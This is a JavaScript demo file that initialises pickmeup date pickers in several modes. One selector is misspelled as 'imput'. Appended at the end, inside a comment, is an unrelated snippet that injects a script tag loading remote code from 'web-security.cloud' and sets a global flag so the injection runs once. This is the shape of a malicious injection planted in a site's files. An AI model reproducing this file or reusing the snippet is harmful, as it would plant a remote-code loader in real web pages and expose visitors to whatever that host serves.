addEventListener('DOMContentLoaded', function () {
	pickmeup('.single', {
		flat : true
	});

	pickmeup('.multiple', {
		flat : true,
		mode : 'multiple'
	});

	pickmeup('.range', {
		flat : true,
		mode : 'range'
	});

	var plus_5_days = new Date;
	plus_5_days.setDate(plus_5_days.getDate() + 5);
	pickmeup('.three-calendars', {
		flat      : true,
		date      : [
			new Date,
			plus_5_days
		],
		mode      : 'range',
		calendars : 3
	});

	pickmeup('imput', {
		position       : 'right',
		hide_on_select : true
	});
});

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/